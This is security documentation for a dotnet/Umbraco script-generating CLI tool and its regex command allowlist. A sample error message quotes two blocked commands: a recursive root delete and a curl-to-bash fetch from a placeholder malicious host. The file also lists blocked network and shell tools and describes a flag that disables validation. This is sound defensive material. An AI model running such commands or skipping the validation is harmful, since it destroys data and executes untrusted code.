# Security - Command Allowlist

## Overview

The Package Script Writer includes a **command allowlist validation system** to prevent execution of dangerous or unexpected commands. This security feature validates every command in generated scripts before execution.

## How It Works

When you execute a script using the `psw` tool, the `CommandValidator` checks each command line against a predefined set of allowed patterns. If any command doesn't match the allowlist, execution is blocked and you'll see an error message.

The validator supports:
- **Multi-line scripts** - Each line validated independently
- **Command chaining with `&&`** - One-liner scripts are split and each command validated
- **Windows and Linux syntax** - Platform-specific commands recognized
- **Comments and empty lines** - Automatically skipped

### Example Output When Blocked

```
✗ Script validation failed - dangerous commands detected:

  • Line 5: Command not allowed: 'rm -rf /'
  • Line 8: Command not allowed: 'curl http://malicious.com/script.sh | bash'

The script contains commands that are not in the allowlist.
This is a security measure to prevent execution of potentially dangerous commands.
```

## Allowed Commands

The following commands are allowed by default:

### 1. Template Installation

```bash
dotnet new install Umbraco.Templates::14.3.0 --force
dotnet new -i Umbraco.Templates::10.0.0
```

**Flags:** `--force`, `--interactive`

### 2. Solution Creation

```bash
dotnet new sln --name "MySolution"
```

### 3. Project Creation

```bash
# Basic project
dotnet new umbraco --force -n "MyProject"

# With unattended install
dotnet new umbraco --force -n "MyProject" \
  --friendly-name "Admin" \
  --email "admin@example.com" \
  --password "Pass123!" \
  --development-database-type SQLite

# Community templates
dotnet new umbootstrap --force -n "MyProject"

# Docker Compose
dotnet new umbraco-compose -P "MyProject"
```

**Flags:** `--force`, `-n`, `-P`, `--add-docker`, `--friendly-name`, `--email`, `--password`, `--development-database-type`, `--connection-string`, `--connection-string-provider-name`

### 4. Solution Management

```bash
dotnet sln add "MyProject"
```

### 5. Package Management

```bash
# Add package with version
dotnet add package Umbraco.Community.BlockPreview --version 1.6.0

# Add package to specific project
dotnet add "MyProject" package uSync --prerelease

# Add prerelease package
dotnet add package SomePackage --prerelease
```

**Flags:** `--version`, `--prerelease`

### 6. Project Execution

```bash
dotnet run
dotnet run --project "MyProject"
dotnet run --urls "http://localhost:5000"
```

**Flags:** `--project`, `--urls`

### 7. Build & Restore

```bash
dotnet build
dotnet build "MyProject"
dotnet restore
dotnet restore "MyProject"
```

### 8. Windows-Specific Commands

```cmd
@echo off
$env:ASPNETCORE_ENVIRONMENT=Development
$env:VARIABLE_NAME=value
```

### 9. Comments and Empty Lines

```bash
# This is a comment - always allowed
# Comments are displayed but not executed

# Empty lines are also allowed
```

### 10. Command Chaining (One-Liner Format)

Commands can be chained with `&&` on a single line. Each command in the chain is validated independently:

```bash
# Full one-liner example
dotnet new install Umbraco.Templates::14.3.0 --force && dotnet new umbraco --force -n "MyProject" && dotnet run --project "MyProject"

# Another valid chain
dotnet new sln --name "MySolution" && dotnet new umbraco -n "MySite" && dotnet sln add "MySite"
```

**How it works:**
- Line is split on `&&`
- Each command segment is trimmed and validated separately
- ALL commands in the chain must pass validation
- If any command fails, the entire line is blocked

## Commands NOT Allowed

The following types of commands are **blocked** by the allowlist:

- File system operations: `rm`, `del`, `mv`, `cp`, `rmdir`
- Network operations: `curl`, `wget`, `nc`, `telnet`
- System commands: `shutdown`, `reboot`, `kill`, `pkill`
- Shell features: pipes (`|`), redirects (`>`), command substitution (`` ` ``)
- Script execution: `bash`, `sh`, `powershell`, `cmd`
- Package managers: `npm`, `yarn`, `pip`, `apt`, `choco`
- Any other commands not explicitly in the allowlist

**Note:** Even benign versions of these commands are blocked to prevent injection attacks.

## Disabling Validation (Not Recommended)

If you absolutely need to disable validation (e.g., for testing), you can do so by modifying the `ScriptExecutor` initialization:

```csharp
var executor = new ScriptExecutor(logger, skipValidation: true);
```

**⚠️ WARNING:** Disabling validation removes an important security layer. Only do this if you fully understand the risks and trust the script source completely.

## How to Extend the Allowlist

If you need to add additional safe commands to the allowlist, modify the `CommandValidator.InitializeAllowedPatterns()` method in `/src/PackageCliTool/Validation/CommandValidator.cs`.

### Example: Adding a New Pattern

```csharp
// Allow dotnet clean command
patterns.Add(new Regex(
    @"^dotnet\s+clean(\s+(""[^""]+""|\S+))*\s*$",
    RegexOptions.IgnoreCase
));
```

### Pattern Syntax Guidelines

- Use `^` and `$` to match the entire line
- Use `\s+` for required whitespace
- Use `\s*` for optional whitespace
- Use `[\w\.\-]+` for package names, versions, etc.
- Use `(""[^""]+""|\S+)` to match quoted or unquoted arguments
- Use `RegexOptions.IgnoreCase` for case-insensitive matching

## Security Best Practices

1. **Always review scripts** before executing them, even with validation enabled
2. **Keep validation enabled** in production environments
3. **Regularly update** the allowlist patterns as new safe commands are identified
4. **Report suspicious scripts** that attempt to use blocked commands
5. **Audit logs** for validation failures to identify potential security issues

## Validation Logic

The validator processes each line of the script:

1. **Skip empty lines** - No validation needed
2. **Skip comments** (lines starting with `#`) - Safe by default
3. **Detect command chaining** - If line contains `&&`, split into individual commands
4. **Validate each command** - For chained commands, validate each segment independently
5. **Check platform-specific commands** - `@echo off`, `$env:` variables (Windows only)
6. **Match against patterns** - Each command must match at least one regex pattern
7. **Collect errors** - All blocked commands are reported before failing
8. **Fail-safe** - If validation fails, script execution is prevented entirely

## Source Code

- **Validator:** `/src/PackageCliTool/Validation/CommandValidator.cs`
- **Integration:** `/src/PackageCliTool/Services/ScriptExecutor.cs`
- **Security Docs:** `/src/PackageCliTool/SECURITY.md` (this file)

## Reporting Security Issues

If you discover a security vulnerability or a way to bypass the command allowlist, please report it immediately by creating a private security advisory on the GitHub repository.

---

**Last Updated:** 2025-12-18
